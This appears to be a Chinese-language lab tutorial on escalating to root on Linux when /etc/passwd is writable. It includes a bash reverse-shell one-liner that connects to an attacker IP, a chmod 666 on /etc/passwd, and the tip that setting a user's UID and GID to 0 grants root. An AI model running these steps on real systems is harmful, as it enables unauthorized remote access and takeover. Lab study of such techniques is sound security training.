### /etc/passwd 配置错误提权

环境准备：一台 KaliLinux（攻击者）和一台 Ubuntu 12.04.5（靶标）

![](https://pic1.imgdb.cn/item/68bf548958cb8da5c88af39e.png)

![](https://pic1.imgdb.cn/item/68bf54b358cb8da5c88af3bc.png)

在靶标上手动创建反弹 Shell 模拟已进入内网情况

```sh
bash -i >& /dev/tcp/192.168.41.151/6767 0>&1
```

![](https://pic1.imgdb.cn/item/68bf558958cb8da5c88af412.png)

手动修改 `/etc/passwd` 权限

```sh
chmod 666 /etc/passwd
```

![](https://pic1.imgdb.cn/item/68c70f62c5157e1a88020e11.png)

![](https://pic1.imgdb.cn/item/68c713e0c5157e1a8802127e.png)

**用户名（login name）** — `supermanqiang`

 这是用于登录系统的账号名

**密码字段（password field）** — `x`

 现代 Linux 系统通常在 `/etc/shadow` 存放加密的密码哈希；`x` 表示密码在 `/etc/shadow`，而不是直接放在 `/etc/passwd` 中

- 如果这里是 `*` 或 `!`，通常表示帐号被锁定/不能用密码登录

**用户 ID（UID）** — `1000`

 数字标识用户身份。常见规则：`0` 为 root，`1000` 常是第一个普通用户（取决于发行版）

**组 ID（GID）** — `1000`

 用户所属的主组 ID。通常会对应 `/etc/group` 中的某个组名（通常第一个用户会创建同名组，GID 与 UID 相同）

**GECOS 字段（用户信息）** — `supermanqiang,,,`

 这是一个用逗号分隔的可选信息（通常可包含全名、房间号、工作电话、家庭电话等）

- 在这例子中只有 `supermanqiang`（可能是全名），后面三个逗号表示后面三个子字段为空

**家目录（home directory）** — `/home/supermanqiang`

 用户登录后默认的工作目录

**登录 shell（login shell）** — `/bin/bash`
 用户登录时启动的 shell；常见还有 `/bin/sh`, `/bin/zsh`, `/usr/sbin/nologin`（禁止交互登录）等

将两个 1000 修改为 0 即可提权